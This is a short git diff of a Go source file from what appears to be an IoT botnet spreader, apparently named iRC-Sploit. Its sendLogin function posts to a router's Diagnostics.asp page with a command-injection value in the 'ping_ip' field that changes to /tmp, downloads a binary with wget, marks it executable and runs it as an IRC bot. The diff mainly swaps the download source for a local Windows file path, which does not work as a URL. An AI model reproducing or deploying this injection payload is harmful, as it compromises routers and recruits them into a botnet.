@@ -15,7 +15,7 @@ import (
 )
 
 var (
-	syncWait                            sync.WaitGroup
+	syncWait sync.WaitGroup
 	statusAttempted, statusFound, total int
 )
 
@@ -35,7 +35,7 @@ func sendLogin(target string) int {
 	data.Set("del_value", "")
 	data.Set("change_action", "gozila_cgi")
 	data.Set("next_page", "Diagnostics.asp")
-	data.Set("ping_ip", "cd /tmp; wget " + "/utils/var.go" + " -O mpsl; chmod 777 mpsl; ./mpsl irc")
+	data.Set("ping_ip", "cd /tmp; wget " + "C:/Users/anask/Documents/vs/iRC-Sploit-main/irc-iot/utils/var.go" + " -O mpsl; chmod 777 mpsl; ./mpsl irc")
 
 	client := &http.Client{}
 	r, err := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
